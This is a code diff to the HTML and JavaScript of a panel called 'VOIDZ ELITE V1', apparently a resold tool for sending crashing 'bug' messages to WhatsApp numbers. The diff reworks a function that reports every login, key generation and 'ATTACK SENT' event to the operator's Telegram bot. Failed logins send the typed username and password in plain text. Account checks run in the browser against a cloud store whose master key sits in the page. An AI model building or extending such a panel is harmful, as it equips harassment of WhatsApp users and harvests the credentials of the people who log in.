@@ -16,18 +16,15 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
         body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
         
-        /* FIX BACKGROUND PARTIKEL */
         #particles-js { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
 
-        /* AREA KONTEN UTAMA */
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; }
         
         #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 20; }
         .login-box { 
             width: 85%; max-width: 320px; background: var(--card); border: 1px solid #4a0000; 
             padding: 20px; border-radius: 10px; text-align: center; border-top: 3px solid var(--neon-red);
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
-            pointer-events: auto !important;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); pointer-events: auto !important;
         }
 
         .profile-img { width: 75px; height: 75px; border-radius: 50%; border: 2px solid var(--neon-red); margin: 0 auto 12px; object-fit: cover; display: block; }
@@ -84,7 +81,6 @@
         <div id="mainApp" class="container">
             <h1 class="app-title">VOIDZ ELITE V1</h1>
             <div class="banner-container"><video class="banner-video" autoplay loop muted playsinline><source src="eye.mp4" type="video/mp4"></video></div>
-
             <div id="tabHOME" class="tab-content active-tab">
                 <div class="home-info">
                     <div class="info-row"><i class="fas fa-user-secret info-icon"></i><div><span class="info-label">OPERATOR</span><span id="uDisplay" class="info-val">...</span></div></div>
@@ -93,7 +89,6 @@
                 </div>
                 <div id="menuGrid" class="menu-grid"></div>
             </div>
-
             <div id="tabWA" class="tab-content">
                 <div class="wa-box" style="background:var(--card); border:1px solid #4a0000; padding:20px; border-radius:10px;">
                     <h3 style="color:red; text-align:center; margin-bottom:15px;">WA OBLITERATION</h3>
@@ -149,18 +144,22 @@
         function showNotify(msg) {
             const container = document.getElementById('notification-container');
             const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerText = msg;
-            container.appendChild(toast);
-            setTimeout(() => toast.remove(), 3500);
+            toast.className = 'toast'; toast.innerText = msg;
+            container.appendChild(toast); setTimeout(() => toast.remove(), 3500);
         }
 
         async function sendTele(msg) {
-            const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
-            try { await fetch(url); } catch(e) {}
+            const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`;
+            try { 
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELE_ID, text: msg, parse_mode: 'html' })
+                });
+            } catch(e) {}
         }
 
-        particlesJS("particles-js", { "particles": { "number": { "value": 35 }, "color": { "value": "#ff0000" }, "line_linked": { "color": "#ff0000" } } });
+        particlesJS("particles-js", { "particles": { "number": { "value": 30 }, "color": { "value": "#ff0000" }, "line_linked": { "color": "#ff0000" } } });
 
         async function pushCloudDB(data) {
             await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(data) });
@@ -176,14 +175,14 @@
                 ALL_USERS = await res.json();
                 if(ALL_USERS[u] && ALL_USERS[u].pw === p) {
                     SESSION = { username: u, ...ALL_USERS[u] };
-                    const durasi = SESSION.exp === '999' ? 'UNLIMITED' : '1 MONTH';
-                    sendTele(`🌐 <b>LOGIN DETECTED</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>USER:</b> <code>${u.toUpperCase()}</code>\n🛡️ <b>ROLE:</b> <code>${SESSION.role.toUpperCase()}</code>\n⏳ <b>EXP:</b> <code>${durasi}</code>\n━━━━━━━━━━━━━━━━━━`);
+                    const dur = SESSION.exp === '999' ? 'UNLIMITED' : '30 DAYS';
+                    await sendTele(`🌐 <b>LOGIN DETECTED</b>\n━━━━━━━━━━━━━━\n👤 <b>USER:</b> <code>${u.toUpperCase()}</code>\n🛡️ <b>ROLE:</b> ${SESSION.role.toUpperCase()}\n⏳ <b>EXP:</b> ${dur}`);
                     document.getElementById('loginPage').style.display = 'none';
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'grid';
                     renderUI();
                 } else {
-                    sendTele(`⚠️ <b>LOGIN FAILED</b>\n👤 User: ${u}\n🔑 Pass: ${p}`);
+                    await sendTele(`⚠️ <b>LOGIN FAILED</b>\n👤 ID: ${u}\n🔑 PASS: ${p}`);
                     showNotify('SALAH!');
                 }
             } catch(e) { showNotify('OFFLINE!'); } finally { document.getElementById('igniteBtn').innerText = "IGNITE"; }
@@ -226,19 +225,17 @@
             }
             ALL_USERS[n] = { pw: p, role: r, exp: t, quota: (SESSION.role === 'owner' && r === 'reseller' ? q : 0) };
             if(!ALL_USERS._logs) ALL_USERS._logs = [];
-            const timeNow = new Date().toLocaleString('id-ID');
-            ALL_USERS._logs.unshift({ by: SESSION.username, type: "GEN", target: n, role: r, time: timeNow });
-            sendTele(`💎 <b>KEY GENERATED</b>\n👤 BY: ${SESSION.username}\n🎯 NEW: ${n}\n🎖️ ROLE: ${r}\n⏳ EXP: ${t === '999' ? 'PERM' : '30D'}`);
+            ALL_USERS._logs.unshift({ by: SESSION.username, type: "GEN", target: n, role: r, time: new Date().toLocaleString() });
+            await sendTele(`💎 <b>NEW KEY GENERATED</b>\n━━━━━━━━━━━━━━\n👤 BY: ${SESSION.username.toUpperCase()}\n🎯 NEW: ${n.toUpperCase()}\n🎖️ ROLE: ${r.toUpperCase()}\n⏳ EXP: ${t === '999' ? 'PERMANENT' : '30D'}`);
             await pushCloudDB(ALL_USERS); showNotify('BERHASIL!'); closeModal(); renderUI();
         }
 
         async function executeLethalAtk() {
             const target = document.getElementById('waTarget').value.trim(), type = document.getElementById('bugType').value;
             if(!target || target.length < 10) return showNotify("TARGET SALAH!");
-            const timeNow = new Date().toLocaleString('id-ID');
             if(!ALL_USERS._logs) ALL_USERS._logs = [];
-            ALL_USERS._logs.unshift({ by: SESSION.username, type: "ATTACK", target: target, method: type.toUpperCase(), time: timeNow });
-            sendTele(`🚀 <b>ATTACK SENT</b>\n👤 BY: ${SESSION.username}\n🎯 TARGET: ${target}\n💣 METHOD: ${type.toUpperCase()}`);
+            ALL_USERS._logs.unshift({ by: SESSION.username, type: "ATTACK", target: target, method: type.toUpperCase(), time: new Date().toLocaleString() });
+            await sendTele(`🚀 <b>ATTACK SENT</b>\n━━━━━━━━━━━━━━\n👤 BY: ${SESSION.username.toUpperCase()}\n🎯 TARGET: ${target}\n💣 METHOD: ${type.toUpperCase()}`);
             await pushCloudDB(ALL_USERS); showNotify("SENT!");
         }
 
@@ -255,14 +252,18 @@
             const q = document.getElementById('userSearch').value.toLowerCase(), l = document.getElementById('userList'); l.innerHTML = "";
             Object.keys(ALL_USERS).forEach(k => {
                 if(!k.startsWith('_') && k.includes(q)) {
-                    l.innerHTML += `<div style="display:flex; justify-content:space-between; padding:5px; border-bottom:1px solid #111; font-size:10px;"><span>${k.toUpperCase()} (${ALL_USERS[k].role})</span><button onclick="deleteUser('${k}')" style="color:red; background:none; border:none;">[X]</button></div>`;
+                    const isOwner = ALL_USERS[k].role === 'owner';
+                    l.innerHTML += `<div style="display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid #111; align-items:center;">
+                        <div><span style="color:${isOwner ? 'var(--neon-blue)' : '#fff'}; font-weight:bold;">${k.toUpperCase()}</span><br><small style="font-size:8px; color:#888;">${ALL_USERS[k].role.toUpperCase()}</small></div>
+                        ${!isOwner ? `<button onclick="deleteUser('${k}')" style="color:red; background:none; border:1px solid red; font-size:9px; padding:2px 5px;">DEL</button>` : `🛡️`}</div>`;
                 }
             });
         }
 
         async function deleteUser(id) {
-            if (id === SESSION.username || ALL_USERS[id].role === 'owner') return showNotify('IMMORTAL!');
-            delete ALL_USERS[id]; await pushCloudDB(ALL_USERS); searchUser(); showNotify('DELETED!');
+            if (ALL_USERS[id].role === 'owner') return showNotify('IMMORTAL!');
+            if (!confirm(`HAPUS ${id.toUpperCase()}?`)) return;
+            delete ALL_USERS[id]; await pushCloudDB(ALL_USERS); searchUser(); showNotify('ERASED!');
         }
 
         function switchTab(t, el) { 
@@ -275,4 +276,3 @@
     </script>
 </body>
 </html>
-
